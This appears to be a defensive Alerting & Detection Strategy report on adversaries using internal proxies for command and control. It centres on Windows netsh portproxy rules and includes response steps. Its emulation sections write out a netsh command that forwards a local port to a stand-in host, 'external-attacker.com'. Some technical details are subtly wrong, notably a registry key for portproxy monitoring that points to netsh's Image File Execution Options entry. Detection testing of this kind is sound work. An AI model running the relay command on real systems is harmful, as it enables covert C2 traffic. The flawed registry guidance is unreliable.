# Alerting & Detection Strategy (ADS) Report: Detect Adversarial Attempts to Bypass Security Monitoring Using Internal Proxies

## Goal
The primary goal of this strategy is to detect adversarial attempts to bypass security monitoring using internal proxies, specifically by identifying and analyzing activities related to the use of tools like `netsh.exe` on Windows systems to set up reverse proxy services.

## Categorization
- **MITRE ATT&CK Mapping:** T1090.001 - Internal Proxy
- **Tactic / Kill Chain Phases:** Command and Control
- **Platforms:** Linux, macOS, Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1090/001)

## Strategy Abstract
This detection strategy focuses on identifying the creation and use of internal proxies within enterprise environments. The primary data sources for this detection include:
- **Windows Event Logs:** Monitoring for specific event IDs related to `netsh.exe` commands.
- **Network Traffic Analysis:** Detecting unusual patterns in network traffic that suggest proxy usage, such as unexpected connections from known internal IP addresses to external hosts.
- **Process Monitoring:** Identifying processes that are commonly associated with setting up proxies, like `netsh.exe`.

The strategy analyzes patterns indicative of adversaries using internal proxies to mask their command and control (C2) communications. Key indicators include:
- Creation of new proxy rules via `netsh.exe`.
- Unexpected network traffic originating from trusted internal IP addresses.
- Anomalies in process creation and execution patterns.

## Technical Context
Adversaries often use internal proxies to evade detection by security tools that monitor external communication channels. By setting up a reverse proxy within an enterprise network, they can hide their C2 traffic as legitimate outbound traffic. This technique is commonly executed using the `netsh.exe` command in Windows environments, which allows attackers to configure new port forwarding rules.

### Adversary Emulation Details
To emulate this technique:
1. **Using `netsh.exe`:** Execute commands like `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=external-attacker.com connectport=80` to create a proxy rule.
2. **Network Traffic Simulation:** Initiate connections from an internal IP address using the configured proxy port.

## Blind Spots and Assumptions
- **Blind Spots:**
  - Encrypted traffic analysis may not reveal the presence of proxies if payloads are obfuscated.
  - Detection may be limited to environments where detailed logging is enabled.
  
- **Assumptions:**
  - Assumes that `netsh.exe` usage for proxy setup is an anomaly in most enterprise environments.
  - Relies on baseline behavior analytics to distinguish between normal and malicious use of internal resources.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate network administrators configuring proxies for testing or development purposes.
- Software applications that use `netsh.exe` as part of their configuration routines without malicious intent.
- Misconfigured network devices generating similar traffic patterns.

## Priority
**Severity: High**

Justification:
- Internal proxies can significantly undermine an organization's security posture by enabling adversaries to maintain persistent access and exfiltrate data undetected.
- The technique is a common evasion method used in sophisticated attacks, making its detection critical for timely response and mitigation.

## Validation (Adversary Emulation)
To validate this strategy in a controlled test environment:

### Connection Proxy
1. **Configure Internal Proxy:**
   - Open Command Prompt as Administrator.
   - Execute: `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=external-attacker.com connectport=80`

2. **Simulate Traffic:**
   - Use a tool like `curl` or `wget` from an internal machine to make requests through the configured proxy.
   - Example command: `curl --proxy localhost:8080 http://example.com`

### Connection Proxy for macOS UI
1. **Using Proxychains:**
   - Install and configure `proxychains` on a macOS test environment.
   - Modify `/etc/proxychains.conf` to include the internal proxy settings.

2. **Test Connectivity:**
   - Run an application through `proxychains` to route traffic via the internal proxy.

### Portproxy Reg Key
1. **Registry Monitoring:**
   - Monitor registry keys associated with `netsh.exe` configurations, such as `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\netsh.exe`.

## Response
When an alert for this detection strategy fires:
1. **Immediate Isolation:** Quarantine the affected system to prevent further potential compromise.
2. **Investigate Traffic Patterns:** Analyze network traffic logs to identify unusual patterns or destinations.
3. **Review Process Logs:** Examine process creation and execution histories on the affected machine.
4. **Verify Legitimacy:** Confirm if the proxy setup is part of a legitimate administrative task.
5. **Remediation:** Remove unauthorized proxy configurations and restore system integrity.

## Additional Resources
- [Netsh.exe Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh)
- [Port Forwarding via Netsh.EXE](https://docs.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc753579(v=ws.10))
- [Proxychains Configuration Guide](https://proxychains.net/config.html)

This report provides a comprehensive overview of detecting and responding to internal proxy usage, aligning with the MITRE ATT&CK framework to enhance organizational security measures.